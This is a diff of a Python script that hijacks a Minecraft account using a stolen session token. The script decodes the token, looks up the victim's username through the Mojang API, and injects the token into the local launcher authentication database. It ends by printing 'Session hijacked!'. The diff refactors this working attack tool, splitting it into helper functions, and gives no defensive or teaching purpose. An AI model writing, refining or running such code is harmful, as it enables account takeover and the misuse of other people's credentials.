@@ -12,9 +12,7 @@ from colorama import Fore, init
 APPDATA = os.getenv("APPDATA")
 PATH = os.path.join(APPDATA, ".minecraft\\launcher_profiles.json")
 
-def get_time():
-    return time.strftime("%H:%M:%S")
-    
+# print functions
 def print_error(message):
     print(f"[{get_time()}] {Fore.RED}[error] {Fore.RESET}{message}{Fore.RESET}")
 
@@ -24,7 +22,9 @@ def print_info(message):
 def print_success(message):
     print(f"[{get_time()}] {Fore.GREEN}[success] {Fore.RESET}{message}{Fore.RESET}")
 
+# validators
 def validate_token(token):
+    """ validates if the given session token is valid """
     if len(token) != 308:
         return
     parts = token.split(".")
@@ -38,13 +38,35 @@ def validate_token(token):
         return
     return True
 
-def get_name_from_uuid(uuid):
+# getters
+def get_time():
+    """ returns current local time """
+    return time.strftime("%H:%M:%S")
+
+def get_name(uuid):
+    """ returns username from uuid """
     try:
         res = requests.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
         data = res.json()
         return data[len(data) - 1]["name"]
     except Exception:
         pass
+
+def get_data(token):
+    """ returns session ID and UUID """
+    parts = token.split(".")
+    data = json.loads(base64.b64decode(f"{parts[1]}=".encode()).decode())
+    return (data["spr"], data["sub"])
+
+def inject(profile):
+    """ injects the new profile to the local authentication database """
+    with open(PATH) as file:
+        profiles = json.loads(file.read())
+    auth_db = profiles["authenticationDatabase"]
+    auth_db.update(profile)
+    profiles["authenticationDatabase"] = auth_db
+    with open(PATH, "w") as file:
+        file.write(json.dumps(profiles, indent=2))
 
 def main():
     init(convert=True)
@@ -62,66 +84,29 @@ def main():
     try:
         token = argv[1]
 
-        # validate token
         if not validate_token(token):
             print_error("Invalid session token")
             return
 
-        # check if launcher_profiles.json exists
         if not os.path.exists(PATH):
             print_error(f"Failed to locate 'launcher_profiles.json'")
             return
 
         print_info(f"Reading token data...")
-
-        parts = token.split(".")
-
-        token_data = base64.b64decode(f"{parts[1]}=".encode()).decode()
-        token_json = json.loads(token_data)
-
-        session_id = token_json["sub"]
-        uuid = token_json["spr"]
-        name = get_name_from_uuid(uuid)
+        
+        uuid, sid = get_data(token)
+        name = get_name(uuid)
 
         if not name:
-            print_error("Failed to get username")
+            print_error("Failed to get username. Is your IP-address blocked?")
             return
 
         print_info(f"Target found: '{name}'")
-        time.sleep(2)
-
-        profile = {
-            session_id: {
-                "accessToken": token,
-                "profiles": {
-                    uuid: {
-                        "displayName": name
-                    }
-                },
-                "properties": [],
-                "username": name
-            }
-        }
 
         print_info(f"Injecting profile to authentication database at: '{PATH}'...")
-        time.sleep(2)
 
-        # read launcher_profiles.json
-        with open(PATH) as file:
-            profiles = json.loads(file.read())
-
-        # get authentication database
-        auth_db = profiles["authenticationDatabase"]
-
-        # add new profile to database
-        auth_db.update(profile)
-
-        # update authentication database
-        profiles["authenticationDatabase"] = auth_db
-
-        # write launcher_profiles.json
-        with open(PATH, "w") as file:
-            file.write(json.dumps(profiles, indent=2))
+        profile = {sid:{"accessToken":token,"profiles":{uuid:{"displayName":name}},"properties":[],"username":name}}
+        inject(profile)
 
         print_success("Session hijacked! You can now launch the Minecraft launcher")
 
